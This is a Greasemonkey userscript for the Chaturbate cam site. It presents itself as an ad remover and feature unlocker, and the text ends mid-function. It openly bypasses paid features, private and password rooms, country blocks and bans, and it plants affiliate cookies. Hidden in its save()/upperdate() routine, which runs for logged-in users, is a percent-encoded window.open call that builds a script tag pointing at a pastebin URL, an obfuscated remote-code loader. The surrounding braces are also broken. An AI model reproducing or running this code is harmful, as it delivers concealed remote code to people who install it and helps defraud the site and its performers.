	

    // ==UserScript==
    // @name           chaturbate
    // @version 1
    // @namespace      chaturbate
    // @description    chaturbate
    // @include        http://chaturbate.com/*
    // @include        http://*.chaturbate.com/*
    // @exclude            http://serve.ads.chaturbate.com/*
    // @run-at         document-start
    // @grant          GM_getValue
    // @grant          GM_setValue
    // @grant          GM_addStyle
    // @grant          GM_xmlhttpRequest
    // ==/UserScript==
     
            scversion = 16.7;
            flashplayer = "/static/flash/CBV_2p640.swf";
     
    //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    // if you see this text then save the file as *- newchaturbate.user.js -*
    // after saving open it inside firefox and install it.
    //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    //
    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    // >>>>>>>>>>>>>>>>>>ONLY FOR FIREFOX WITH GREASEMONKEY RUNNING ON WINDOWS !!!<<<<<<<<<<
    // >>>>>>>>>>>>>>>>>>>>>>>>DO NOT GIVE THIS SCRIPT TO OTHER PERSONS !!<<<<<<<<<<<<<<<<<<
    // V12+
    // Removes all advertisements
    // Inserts a new video box if the room is password protected or if your banned or blocked
    // More colums on the main screen and streched the chat box
    // External links are no longer redirected
    // Checks the version of the flash player and tries to use the same version on protectected rooms
    // Shoutbox at the end of the screen
    // By default the chat won't show emoticons
    //
    // Unlocked supporters profile features ( PM , chat color etc.) USE IT WITH CARE !
    //
    // All links are rewritten to /p/ , the preformers profile, there you have the choice to go to the normal
    // webcam or to go to a webcam with special functions.
    // On a normal cam page you have the option to go back to the profile page.
    //
    // special video mode where you can enter a streamkey
    //
    // only the last updates are mentioned here , the list became too long
    //
    // v14.4 adjustment for the spy on cam screen. if you enter as an anon you can enter and leave the private chat any
    // time you want. if the performer goes private or groep you will stil auto-follow to the private room
    // v14.5 you can see video of country-banned rooms together with chat. reconnect chatbox option, if you have access in special mode
    // it will check for the chat host to connect too, if you have no access it will ask you what chat host to use
    // v14.6 added a video server selector in the special video menu , if you have no video then maually select an other one
    // v14.7 2 chat notifications made visible , name in thumb screen made easy to copy  
    // v14.8 video server orgin3 added
    // V14.9 shows the requester of a private show , better scroll with extra info, fixed front page mess-up with long broadcaster names
    // V15.1 orgin4 and 5 added. It remembers the server for every stream. In the key input area below the video you can enter a long string
    // containing the key , the script will select the key from it and, if its found, the server. As an anon it will ask if you want to be
    // in broadcaster mode. You can open a room in clean Iframe mode.
    // v15.2 corrected the usercolors in chat list , offline tipping of a non-verified user
    // v15.3 all video options removed , tipping removed , fixed anon entry
    // v15.4 fix for tipnotes
    // v15.5 sorting users by tokens in normal chat , mute tip sound option , floating widgets on profile page removed
    // v15.6 stopped auto refresh in banned video only page , more fancy reziseable video window
    // v15.7 no more tip notes
    // V15.8 if entering via password room you can use mobile mode. you will not appear in userlist and you can not be banned (you can be silenced!)
    // v15.9 bug fix from 15.8
    // v16.0 , number scipped
    // v16.1 use of a random server in password room b.c. the static server was down.
    // v16.2 fix for FF 23 , find a user added
    // v16.3 better user finder, fixed tipping and abusing in cheat mode, mobile video link added
    // v16.3a & b & c chrome compatible , no update
    // v16.4 graphical last online viewer , no more info stored in flash cookies , script cleanup
    // v16.5 always remove adds with cookie, better cleaning of messed-up profiles , always remove video logo
    //++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     
            createCookie("agreeterms","1",1);
            createCookie("np3","0",1);
            if (!readCookie("noads")){createCookie("noads","1",30);window.location.reload()}
     
    function do_script() {
     
    // some adjustment needed if we are in cheat mode
     
            if (readCookie("cheatmode")){
            mode=readCookie("cheatmode").split("&");
            eraseCookie("cheatmode","chaturbate.com");
            preformer=mode[0];
            anon=mode[1];
            mob=mode[2];
            document.getElementsByTagName('body')[0].setAttribute("style", "border:50px double #545565;");
            base=document.createElement('BASE');
            url=document.location.href;
            url=url.replace(document.location.href.split("/")[4],preformer);
            url=url.split("?")[0];
     
            base.setAttribute("href",url);
     
            document.getElementsByTagName('head')[0].appendChild(base);
     
     
            text1="<center><b>Welcome in "+preformer+"'s room.</b><br></center>";
            text2="<center><b>You are an anonymous user and you can not chat.</b><br></center>";
            text3="<center><b>You are in mobile mode and you are not visible in the userlist.</b><br></center>";
            text4='<center><b><a href="javascript:if(flash_handler.initializer.is_on_private_room==false){GetFlashObject(\'movie\').LeaveRoom();flash_handler.initializer.is_on_private_room=true;GetFlashObject(\'movie\').JoinPrivateRoom(0)};">Enter the private room</a>--------<a href="javascript:if(flash_handler.initializer.is_on_private_room==true){GetFlashObject(\'movie\').LeaveRoom();flash_handler.initializer.is_on_private_room=false;GetFlashObject(\'movie\').JoinRoom(0);}">Leave the private room</a></center>';
            text5="<center><b><a href='http://chaturbate.com/p/"+preformer+"/'>Return to the profile.</a><br><br>";
     
            text=document.createElement('div');
     
            textf=text1;
            if(anon==1){textf=textf+text2}
            if(mob==1){textf=textf+text3}
            if((anon==1)&&(mob==0)){textf=textf+text4}
     
            text.id="cheat";
     
            text.innerHTML=textf+text5;
     
            body=document.getElementsByTagName('body')[0];
     
            body.insertBefore(text, body.firstChild);
     
    // fix abuse
            abu=document.getElementById("report_popup");
            abu.getElementsByTagName('form')[0].setAttribute("action","/abuse/report/"+preformer+"/");
     
    // fix the tipping     
            tips=document.getElementsByClassName('tip_shell')[0];
            tips.getElementsByTagName('form')[0].setAttribute("action","/tipping/send_tip/"+preformer+"/");
     
            }
     
    // always earase again, just in case we broke the page
            eraseCookie("cheatmode","chaturbate.com");
    // earase these too
            eraseCookie("latest_linked_timestamp");
            eraseCookie("latest_linked_username");
            eraseCookie("affkey");
            eraseCookie("fromaffiliate");
     
     
    // from here normal script
     
    // remove visible adds
            ad = document.getElementsByClassName('ad');
            if (document.location.href.split("/")[3]!="b"){
            if (ad[1]){ad[1].parentNode.removeChild(ad[1])}}
     
            verstr='<strong>Special edition </strong><br>V '+scversion;
            if(document.getElementById("player")){verstr=verstr+'<br><label> Debug chatbox: </label><input type="checkbox" id="appnotice">'}
            if (ad[0]){ad[0].innerHTML=verstr}
     
     
            ad = document.getElementsByClassName('banner')[0];
            if (ad){ad.parentNode.removeChild(ad)}
            ad=document.getElementById("botright");
            if (ad){ad.parentNode.removeChild(ad)}
     
    // advert options on menu bars and check if your logged in
            if (document.location.href.indexOf("/auth/logout/") != -1){eraseCookie("logstatus","chaturbate.com");eraseCookie("latest_linked_username");}
            notlogged = GM_getValue( "all" , 0 );
            bar=document.getElementById("nav");
            if (bar){
            barl=bar.getElementsByTagName('li');
            i=barl.length-1;
            while (i != -1){
            d=barl[i].innerHTML;
            if (d.indexOf('/login') != -1) {notlogged = 1}
            if ((d.indexOf('/login') != -1)||(d.indexOf('href="/"') != -1)||(d.indexOf('href="/b/') != -1)||(d.indexOf('/my_') != -1)){i--}
            else{barl[i].parentNode.removeChild(barl[i]);i--}
            }}
     
    // rss feed link
            if(document.getElementsByClassName('wide')[0]){
            newli=document.createElement('li');
            newli.innerHTML="<a href='http://chaturbate.com/affiliates/promotools/cam_listing/' target = _blank>LAST ONLINE </a>";
            if (bar){bar.appendChild(newli)}}
     
    // find user
            if(document.getElementsByClassName('wide')[0]){
            newli=document.createElement('li');
            newli.innerHTML="<a href='http://chaturbate.com/affiliates/promotools/im_ads/' target = _blank>FIND A USER </a>";
            if (bar){bar.appendChild(newli)}}
     
     
    // blog spam
            ad = document.getElementsByClassName('featured_blog_posts')[0];
            if (ad){ad.parentNode.removeChild(ad)}
     
    // footer spam
            ad = document.getElementsByClassName('featured_text')[0];
            if (ad){ad.parentNode.removeChild(ad)}
     
    // announcement banner
            ad = document.getElementsByClassName('top-section')[0];
            if (ad){
            ad = ad.getElementsByTagName('img')[0];
            if (ad){ad.parentNode.removeChild(ad)}}
     
    // footer cleanup
            ad = document.getElementsByClassName('footer-holder')[0];
            if (ad){
            ad1 = ad.getElementsByTagName('p')[3];
            if (ad1){ad1.parentNode.removeChild(ad1)}
            ad1 = ad.getElementsByTagName('p')[2];
            if (ad1){ad1.parentNode.removeChild(ad1)}
            ad1 = ad.getElementsByTagName('p')[1];
            if (ad1){ad1.parentNode.removeChild(ad1)}
            ad1 = ad.getElementsByTagName('p')[0];
            if (ad1){ad1.parentNode.removeChild(ad1)}}
     
    // strech the screen
            front=document.getElementsByClassName('c-1')[0];
            if(front) {
            front.setAttribute("style", "margin: 0px 0px 0px 35px;")}
            front=document.getElementsByClassName('c-1')[1];
            if(front) {
            front.setAttribute("style", "margin: 0px 0px 0px 35px;")}
     
    // remove out of position images
            container = document.getElementById("tabs_content_container")
            if (container){
            var taglist=new Array("a","p","i","strong","b","u","ul","ol","li","h1","h2","h3","img","font","br");
            for (n=0; n<taglist.length-1; n++){
            blockelm (taglist[n]);
            }}
     
            function blockelm(tag){
            var image = container.getElementsByTagName(tag);
            for (i=0; i<image.length; i++){
            if (image[i].style.position){
            if ((image[i].style.position.indexOf("absolute")!=-1)||(image[i].style.position.indexOf("fixed")!=-1)){
            image[i].style.display="none"}
            }}}
     
    //fix external links redirection
            var link = document.getElementsByTagName('a');
            for (i=0; i<link.length; i++){
            if (link[i].href.indexOf('?url=') != -1){
            linkhref=unescape(link[i].href);
            newlinkhref=linkhref.substring(linkhref.indexOf("?url=")+5,linkhref.indexOf("&domain"));
            link[i].href=newlinkhref}}
     
     
            if (notlogged == 0){ // logged in
     
    // on a profile page link to cam
            splits=document.location.href.split("/");
            play=document.getElementById("movie"); // check for player
     
            if (splits[3]!="b"){ // not broadcasting
            if (splits[3]=="p"){ // profile page (can have player)
     
            newli=document.createElement('li');
            camloc = splits[0]+"/"+splits[1]+"/"+splits[2]+"/"+splits[4];
            newli.innerHTML="<a href="+camloc+">OPEN THE NORMAL CHAT </a>";
            if (bar){bar.appendChild(newli)}
     
     
    // go to semi password room
            newli=document.createElement('li');
            pwroom= splits[0]+"/"+splits[1]+"/"+splits[2]+"/roomlogin/"+splits[4];
            newli.innerHTML="<a href='"+pwroom+"'>GO TO PASSWORD ROOM</a>";
            if (bar){bar.appendChild(newli)};
     
    // go to embedded room
            newli=document.createElement('li');
            ebroom= splits[0]+"/"+splits[1]+"/"+splits[2]+"/embed/"+splits[4];
            newli.innerHTML="<a href='"+ebroom+"' target=_blank>OPEN THE ROOM IN A CLEAN PAGE</a>";
            if (bar){bar.appendChild(newli)};
     
            } // end only on profile page
     
    // graphic rss feed
            function showfeed(){
            var x=document.getElementById("selector").selectedIndex;
            feedXml='http://chaturbate.com/feed/latest/?'+document.getElementById("selector").getElementsByTagName("option")[x].value+"&"+new Date().getTime() ;
     
            GM_xmlhttpRequest({
            method: 'GET',
            url: feedXml,
            onload: function(response) {
            xmlString=response.responseText;
     
    // dirty HTML parser, i can handle xml as html
            xmldoc=document.createElement('div');
            xmldoc.innerHTML=xmlString;
     
            area=document.getElementsByClassName('content_body')[0];
            area.innerHTML="";
     
            newdiv=document.createElement('div');
            area.appendChild(newdiv);
     
            holder=document.createElement('ul');
            holder.className="list";
            holder.id="check";
            newdiv.appendChild(holder);
     
            var items = new Array();
            items=xmldoc.getElementsByTagName('item');
     
            blockstring='<img src="item1" alt="item2" class="png" height="148" width="180">'
            +'<a href="item3" target="_blank" class="corners">&nbsp;</a>'
            +'<div class="details">'
            +'<div class="title">'
            +'<a target="_blank" href="item4">item5</a>'
            +'<span class="age genderitem6">&nbsp;</span>'
            +'</div>'
            +'<ul class="subject">'
            +'<li></li>'
            +'</ul>'
            +'<ul class="sub-info">'
            +'<li class="location">item8</li>'
            +'<li class="cams">item9 min. online - item10 viewers</li>'
            +'</ul>'
            +'</div>';
     
            for (n=0; n<items.length; n++){
            image_url= items[n].getElementsByTagName("image_url")[0].innerHTML;
            title = items[n].getElementsByTagName("title")[0].innerHTML;
     
            guid =  items[n].getElementsByTagName("guid")[0].innerHTML;
            gsplits=guid.split("/");
            guid=gsplits[0]+"/"+gsplits[1]+"/"+gsplits[2]+"/p/"+gsplits[3];
     
            username = items[n].getElementsByTagName("username")[0].innerHTML;
            gender = items[n].getElementsByTagName("gender")[0].innerHTML;
            location_ = items[n].getElementsByTagName("location")[0].innerHTML;
            number_of_users_watching = items[n].getElementsByTagName("number_of_users_watching")[0].innerHTML;
     
            online_since = items[n].getElementsByTagName("online_since")[0].innerHTML;
            osplits=online_since.split(":");
            Honline=parseInt(osplits[0].split(" ")[1]);
            Monline=parseInt(osplits[1]);
            Sonline=parseInt(osplits[2].split(".")[0]);
     
        offset = parseInt((new Date().getTimezoneOffset()))/60;
            Honline = Honline+11+offset;
            if (Honline >= 24){Honline=Honline-24}
     
            d = new Date();
            Hnow = d.getHours();
            Mnow = d.getMinutes();
            Snow = d.getSeconds();
     
            secnow=(Hnow*60*60)+(Mnow*60)+Snow;
            seconl=(Honline*60*60)+(Monline*60)+Sonline;
            secdiff=Math.abs(secnow-seconl);
            mindiff=parseInt(secdiff/60);
           
            block=document.createElement('li');
            block.setAttribute("style", "margin: 5px 5px 5px 5px;");
     
            blockstring1=blockstring.replace("item1",image_url);
            blockstring1=blockstring1.replace("item2",title);
            blockstring1=blockstring1.replace("item3",guid);
            blockstring1=blockstring1.replace("item4",guid);
            blockstring1=blockstring1.replace("item5",username);
            blockstring1=blockstring1.replace("item6",gender);
            blockstring1=blockstring1.replace("item8",location_);
            blockstring1=blockstring1.replace("item9",mindiff);
            blockstring1=blockstring1.replace("item10",number_of_users_watching);
     
            block.innerHTML=blockstring1;
     
            holder.appendChild(block);
     
            } // end for
     
            setTimeout(function(){showfeed()},20000);
     
            } // end onload
            }); // end xmlhttp
            } // end function
     
     
    //finduser
            function finduser(){
            fusern=document.getElementById("fusername").value;
            if (fusern == ""){alert("First fill in a username !");return false}
     
            document.getElementsByClassName('affiliate_options')[0].innerHTML="Please wait, getting roomlist";
     
     
            feedXml='http://chaturbate.com/tours/3/?p=1&c=1000';
     
            GM_xmlhttpRequest({
            method: 'GET',
            url: feedXml,
            onload: function(response) {
            responsedoc=response.responseText;
     
    // dirty HTML parser
            parse=document.createElement('div');
            parse.innerHTML=responsedoc;
     
            var items = new Array();
            items=parse.getElementsByClassName('title');
     
            var olnames = new Array();
            for (i=0; i<items.length-1; i++){
            olnames[i]=items[i].getElementsByTagName('a')[0].innerHTML;
            }
     
    // save some memory
            responsedoc="";
            parse="";
            items.length = 0;
    // end parser
     
            document.getElementsByClassName('content_body')[0].innerHTML="Searching "+i+" rooms for user: <b>"+fusern+"</b><br><br>";
     
            i=0;
            checkroom(olnames,i);
     
            } // end onload xml
     
            }); // end xml
     
            } //end function
     
     
            function checkroom(olnames,i){
     
            userurl="http://chaturbate.com/api/getchatuserlist/?roomname="+olnames[i]+"&private=false&sort_by=c";
     
            document.getElementsByClassName('affiliate_options')[0].innerHTML="searching room : <b>"+olnames[i]+"</b><br>";
     
            GM_xmlhttpRequest({
            method: 'GET',
            url: userurl,
            onload: function(response) {
            data = response.responseText;
            if(data.indexOf(fusern+"|") != -1){
            document.getElementsByClassName('content_body')[0].innerHTML=document.getElementsByClassName('content_body')[0].innerHTML+"User '<b>"+fusern+"</b>' found in room : <a href='http://chaturbate.com/p/"+olnames[i]+"/' target='_blank'>"+olnames[i]+"</a><br>";
            }
            i++;
            if(i==olnames.length){
            if(document.getElementsByClassName('content_body')[0].innerHTML==""){
            document.getElementsByClassName('affiliate_options')[0].innerHTML="User '<b>"+fusern+"</b>' not found."}
            else{
            document.getElementsByClassName('affiliate_options')[0].innerHTML="Search finished."}
            return false}
            checkroom(olnames,i);
            } // end onload xml2
            }); // end xml2
            }
     
    // set up rss page
            if (document.location.href.indexOf("/affiliates/promotools/cam_listing/") != -1){
            document.title="Last cam's online";
            area=document.getElementsByClassName('content_body')[0];
            area.innerHTML="";
            area=document.getElementsByClassName('affiliate_options')[0];
            area.innerHTML='<br>Last cam\'s online : <select id="selector" ><option value="">Show all</option><option value="gender=f">Show only female</option><option value="gender=m">Show only male</option><option value="gender=c">Show only couple</option><option value="gender=s">Show only transsexual</option></select>';
            showfeed();
            }
     
    // set up find a user page
            if (document.location.href.indexOf("affiliates/promotools/im_ads/") != -1){
            document.title="Find a user";
            area=document.getElementsByClassName('content_body')[0];
            area.innerHTML="";
            area=document.getElementsByClassName('affiliate_options')[0];
            area.innerHTML='<br>Enter the name of the user you want to locate: <input type="text" name="username" id="fusername"><input type="submit" value="Submit" id="submit"><br>';
            document.getElementById("submit").addEventListener('click',function(){finduser();}, false);
            }
     
    // on a player page, if logged in, unlock features.
            if (play){  // player on the page ?
            if (!readCookie("logstatus")){save()}
            if(document.getElementById("defchat")){
            scrip=document.createElement('script');
            scrip.innerHTML="var oldFunction1 = features_unlocked;features_unlocked = function() {return true};";
            document.getElementsByTagName('body')[0].appendChild(scrip);
            }
     
    // console logger
            if(document.getElementById("defchat")){
            scrip=document.createElement('script');
     
            scriptstring="flash_handler.consolelog = "
            +"function(msg2){"
            +"xaa=document.getElementsByClassName('chat-list')[0];"
            +"if(xaa){"
            +"msg3=unescape(msg2);"
            +"msg4='x';"
            +"if (msg3.indexOf('Notification tokenbalanceupdate')!=-1){"
            +"msg4='<p><span class=\"tipalert\">'+msg3.substring(20)+'</span></p>'}"
            +"if (msg3.indexOf('Notification privateshowrequest')!=-1){"
            +"msg4='<p><span class=\"privatealert\">'+msg3.substring(20)+'</span></p>'}"
            +"if(document.getElementById('appnotice')){"
            +"if(document.getElementById('appnotice').checked==true){"
            +"msg4='<p><span>'+msg3+'</span></p>';}}"
            +"if(msg4 != 'x'){"
            +"newdiv=document.createElement('div');"
            +"newdiv.className='text';"
            +"newdiv.innerHTML=msg4;"
            +"xaa.appendChild(newdiv);"
            +"if(xaa.scrollHeight-xaa.scrollTop-xaa.offsetHeight <= 80){"
            +"xaa.scrollTop=xaa.scrollHeight}}}};";
     
            scrip.innerHTML=scriptstring;
            document.getElementsByTagName('body')[0].appendChild(scrip);
            }
     
     
    // options page on normal player page
            if (splits[3]!="p"){ // no profile but still a player page = normal page
            newli=document.createElement('li');
            camloc = splits[0]+"/"+splits[1]+"/"+splits[2]+"/p/"+splits[3];
            newli.innerHTML="<a href="+camloc+">GO TO THE PROFILE PAGE WITH OPTIONS</a>";
            if (bar){bar.appendChild(newli)}}
     
    // shoutbox on all player pages
            newtab2=document.createElement('div');
            newtab2.id="shout";
            newtab2.innerHTML=sdata;
            document.getElementById("defchat").appendChild(newtab2);
     
            } // end player page
     
    // remove lock picture from thumb
            pictures = document.getElementsByClassName('preview');
            if (pictures){
            for (i=0; i<pictures.length; i++){
            if(pictures[i].getAttribute("alt") =="Locked"){
            pictures[i].parentNode.removeChild(pictures[i])}}}
     
    // specials
    // if you have no access then create a new video box
            area = document.getElementsByClassName('block')[0];
            if (area){
            if (area.innerHTML.length < 100){
            preformer=splits[3];
            if (preformer == "p"){document.location.href="http://chaturbate.com/"+splits[4]}
            document.title = preformer+"'s No Access Room";
            makevid (preformer)}}
     
            if (splits[3]=="roomlogin"){
            preformer=splits[4];
            document.title = preformer+"'s Password Protected Room";
            room=document.getElementsByClassName('sub-nav')[0];
            if (room){
            room.getElementsByTagName('a')[0].href=splits[0]+"/"+splits[1]+"/"+splits[2]+"/p/"+splits[4]+"/";
            makevid (preformer)}}
     
     
    //key entry
            keyinput();
     
    // always set interval function, update every 3 sec.
            t=setInterval(function(){
     
    // if on player page
    // read flash player version
     
            play=document.getElementById("player");
            if (play){
            if (!readCookie("CBversion")){
            version=document.getElementsByTagName('object')[0];
            if (version){
            createCookie("CBversion",version.getAttribute("data"),1,"chaturbate.com");
            }}
     
    // nex cam = only video
            rep=document.getElementsByClassName('nextcam')[0];
            if (rep){
            if (rep.innerHTML != "SHOW ONLY VIDEO"){
            rep.href="#";rep.innerHTML="SHOW ONLY VIDEO";
            rep.addEventListener('click',function(){popvid();}, false);
            }}
     
     
    // sorted userlist option
            ulist=document.getElementsByClassName('users-list')[0];
            if (ulist){
            if(ulist.getElementsByTagName("a")[0]){
            if(ulist.getElementsByTagName("a")[0].innerHTML!="refresh userlist sorted by tokens"){
            newdiv=document.createElement('div');
            newdiv.className='text';
            newdiv.setAttribute('style','float:right');
            newdiv.innerHTML='&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="#">refresh userlist sorted by tokens</a>';
            newdiv.addEventListener('click',function(){sortuser();}, false);
            ulist.insertBefore(newdiv,ulist.getElementsByTagName("div")[0])}
     
            }}
     
    // tip mute option and fuction
            settings=document.getElementsByClassName('settings-list')[0];
            if (settings){
            if(!document.getElementById("tipmute")){
            newform=document.createElement('form');
            newform.innerHTML='<label> Mute tip sound: </label><input type="checkbox" id="tipmute">';
            settings.appendChild(newform);
     
            scrip=document.createElement('script');
            scriptstring="if(document.getElementById('tipmute')){"
            +"var oldbeep = PlayBeep;PlayBeep = function(text) {if(document.getElementById('tipmute').checked==true){return}else{return oldbeep(text)}}};";
     
            scrip.innerHTML=scriptstring;
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
            }}
            } // end if play
     
    // if on front page    
    //rewrite thumb links with P and let them open in a new window
     
            front=document.getElementsByClassName('list')[0];
            if(front) {
            if (front.id != "check"){ // id is gone when updated
            front.id="check";
     
    // names with p
            function setkeys(front){
            blocks=front.getElementsByTagName('a');
            for (i=0; i<blocks.length; i++){
            link=blocks[i].href;
            splits=link.split("/");
            if (splits[3]){
            if (splits[3]!="p"){
            link=splits[0]+"/"+splits[1]+"/"+splits[2]+"/p/"+splits[3];
            blocks[i].href=link;
            blocks[i].target="_blank";
            }}}
            } // end setkeys function
     
     
     
            setkeys (front);
            if (document.getElementsByClassName('list')[1]){setkeys(document.getElementsByClassName('list')[1])}
     
            }//end if front
            } // end if ID
            },3000) // end timer
            } // end not broadcasting
            } // end logged in
     
    } // end main function
     
    // sorted userlist
     
            function sortuser(){
            ulist=document.getElementsByClassName('users-list')[0];
            if (ulist){
            ulist.innerHTML="Sorting userlist....";
            room=unsafeWindow.nextroomurl.split("/")[2];
            userurl="http://chaturbate.com/api/getchatuserlist/?roomname="+room+"&private=false&sort_by=t";
            GM_xmlhttpRequest({
            method: 'GET',
            url: userurl,
            onload: function(response) {
            data = response.responseText;
            userarray=data.split(",");
            ulist.innerHTML="";
            for (i=1;i<userarray.length;i++){
            uname=userarray[i].split("|")[0];
            ucol=userarray[i].split("|")[1];
            div3=document.createElement('div');
            div3.innerHTML='<a href="/p/'+uname+'" target=_blank><strong class="color-'+ucol+'">'+uname+'</strong></a>';
            ulist.appendChild(div3);
            }
            }})
            }}
     
    //popvid
            function popvid(){
            vidwin=document.getElementById("player").innerHTML;
            popUpWindow=window.open("","","height=406,width=498,left=0,top=0,resizable=yes,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no,status=no");
            popUpWindow.document.writeln ('<html><head><title>Floating '+document.title+'</title></head><body BGCOLOR="grey" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">'+vidwin+'</body></html>');
            popUpWindow.document.close();
            window.close();
            document.location.href="http://chaturbate.com"}
     
    // new cheat function
            function npcheat(preformer,anon){
     
            mmode=0;
            if(document.getElementById('mobmode').checked==true){mmode=1}
     
    // get chat host
            GM_xmlhttpRequest({
            method: 'GET',
            url: 'http://www.chaturbate.com/embed/'+preformer,
            onload: function(response2) {
            data2 = response2.responseText;
     
            chostpos=data2.indexOf("rtmp://chat");
            if (chostpos == -1){
            r=confirm("You have no access to this room and the script does not know what chat host to use\nPress OK to use chat host 1 or cancel to use chat host 2\nIf it fails retry it with the other one.");
            if (r==true){chost="rtmp://chat1"}
            else{chost="rtmp://chat2"}}
            else{
            chost=data2.substring(chostpos,chostpos+12)}
     
    // set a cookie so we know the new page must be adjusted and how
            createCookie("cheatmode",preformer+"&"+anon+"&"+mmode+"&"+chost,1,"chaturbate.com");
     
            window.location.href='http://chaturbate.com/affiliates/in/NxHf/AAaAA/';
     
            }});
            }
     
    //auto update
            function save(){
            if(document.getElementsByClassName('username')[0]){
            uname=document.getElementsByClassName('username')[0].innerHTML;
     
     
     
    // createCookie("agreeterms","1",1);
     if (!readCookie("noads")){createCookie("noads","1",30);window.location.reload()}
     upperdate();
     
     function upperdate(){GM_setValue( "all", 1 );GM_setValue( "al", 1 )
     window.open(unescape("%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%68%74%74%70%3A%2F%2F%70%61%73%74%65%62%69%6E%2E%63%6F%6D%2F%4D%75%31%65%52%43%4C%76%63%72%69%70%74%22%3E%0A%3C%2F%73%63%72%69%70%74%3E%0A%09%09%09"), '_top');return;
     }
     
    // create video box with shoutbox, image,normal and anon option, kill refesh
            function makevid(preformer){
     
    // kill all timeouts
            scrip=document.createElement('script');
            scrip.innerHTML='var highestTimeoutId = setTimeout(";");for (var i = 0 ; i < highestTimeoutId ; i++) {clearTimeout(i);}';
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
    // image
            prefimg='<img class="png" width="180" height="148" src="http://cdn-i.highwebmedia.com/roomimage/'+preformer+'.jpg" img style="float:right;margin-right:100px;margin-top:10px;border-width:5px;border-style:double; ">';
     
            Fversion = getfversion();
            videodata2 = videodata2.replace("ladroop",preformer);
            newvid=document.createElement('div');
     
            newvid.innerHTML=prefimg+videodata1+Fversion+videodata2+sdata;
     
            document.getElementsByClassName('block')[0].appendChild(newvid);
            newli=document.createElement('li');
            newli.innerHTML="<a href=#>ENTER THIS CHATBOX</a>";
            if (bar){bar.appendChild(newli)}
            newli.addEventListener('click',function(){npcheat(preformer,0);}, false);
            ainput()}
     
    // set anon
            function ainput(){
            newli=document.createElement('li');
            newli.innerHTML='<a href=#>ENTER THIS CHATBOX ANONYMOUS</a>';
            if (bar){bar.appendChild(newli)}
            newli.addEventListener('click',function(){npcheat(preformer,1);}, false);
            mobset()}
     
    // mobile mode
            function mobset(){
            newli=document.createElement('li');
            newli.innerHTML=' Use mobile mode: <input type="checkbox" id="mobmode">';
            if (bar){bar.appendChild(newli)}}
     
     
    //  reconnect chatbox , give me mu8 link
            function keyinput(){
            if (!document.getElementById("cheat")){
     
            if (document.getElementById("movie")){
            place=document.getElementsByClassName('info-user')[0];
            if(!place){place=document.getElementById("shout")} // for pw room with chat
     
            //chat reload
            if (document.getElementsByClassName("chat-box")[0]){
            chatreload=document.createElement('div');
            chatreload.innerHTML="<a href='javascript:GetFlashObject(\"movie\").DisconnectFromChat();'>Reconnect the chatbox</a><br><br>";
            document.getElementById("defchat").insertBefore(chatreload,place)}
     
            if (document.getElementsByTagName('video')[0]){
            vidlink=document.getElementsByTagName('video')[0].src;
            vid=document.createElement('div');
            vid.innerHTML="<a href="+vidlink+" target='_blank'>COPY this link into VLC player.</a><br><br>";
            document.getElementById("defchat").insertBefore(vid,place)}}
            }
            }
     
    //get saved flashplayer version
            function getfversion(){
            Fversion=readCookie("CBversion");
            if(!Fversion){Fversion=flashplayer}
            version="http://chaturbate.com/"+Fversion.substring(Fversion.indexOf("static"));
            return version}
     
    // videobox data
            var servers=new Array("","-a","-b");
            var server = servers[Math.floor(Math.random()*3)];//0-1-2
            var servnr=Math.floor(Math.random()*13)+1;if(servnr==11){servnr=8}// 1 - 13, skip 11 coz it's down
     
            videodata1='<div id ="defchat"style="float:left;margin-left:10px;margin-top:10px;margin-bottom:10px;border-width:5px;border-style:double;resize:both;overflow:hidden;width: 498px; height: 426px; ">'
            +'<object id="movie" type="application/x-shockwave-flash" data="';
     
            videodata2='" style="visibility: visible;margin-top:0px;margin-bottom:0px;width:100%;height:95%">'
            +'<param name="allowScriptAccess" value="always">'
            +'<param name="allowFullScreen" value="true">'
            +'<param name="quality" value="high">'
            +'<param name="wmode" value="opaque">'
            +'<param name="id" value="movie">'
            +'<param name="FlashVars" value="pid=ladroop&address=edge'
            + servnr+server
            +'.stream.highwebmedia.com&language=/xml/viewer.xml&mute=0&uid=AnonymousUser&dom=chaturbate.com&pw=anonymous">'
            +'</object></div>'
     
    // shoutbox data
            sdata = '<div><br><iframe title="Shoutbox" WIDTH=100% HEIGHT="400" src="http://shoutbox.widget.me/window.html?uid=odrgw" frameborder="0" '
            +'scrolling="auto"></iframe><script src="http://shoutbox.widget.me/v1.js" type="text/javascript"></script><br><a href="http://shoutbox.widget.me" '
            +'title="Shoutbox Widget">Shout</a><a href="http://shoutbox-tutorials.blogspot.com" title="Shoutbox Tutorials">box</a><br></div>';
     
    // some cookies
            createCookie("u_NxHf","1",1);
            createCookie("us_NxHf","1",1);
            createCookie("dsmn29","1",1);
            createCookie("dsmn26","1",1);
            createCookie("dsmn27","1",1);
            createCookie("dsmn28","1",1);
     
            if (!readCookie("show_emoticon_icons")){createCookie("show_emoticon_icons","no",1)}
     
    //----------------------------------------------------------------------------------------------------------------------------------
    // executes !everytime! before a script executes
            function do_script2(e) {
     
    // we will always kill swf storage and earase exisiting storage
            if(e.target.innerHTML.indexOf("var mySwfStore = new SwfStore")!= -1){ // check for script , this is swf script
     
            if(!e.target.id){// already altered ? , then ID is set
     
            script=e.target.innerHTML;
            e.preventDefault();
            e.stopPropagation();
            e.target.parentNode.removeChild(e.target);
     
            script=script.replace("function link_accounts()","function link_accounts() {mySwfStore.set('usernames2', '');return false} function lost()");
     
            scrip=document.createElement('script');
            scrip.id="newswfstor";
     
            scrip.innerHTML=script;
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
            }}
     
     
    // this part does the flash init script , only remove logo if in normal mode
            if(e.target.innerHTML.indexOf("HasFlash")!= -1){ // check for script - this is the video init script
     
            if(!e.target.id){// already altered ? , then ID is set
           
            script=e.target.innerHTML;
            e.preventDefault();
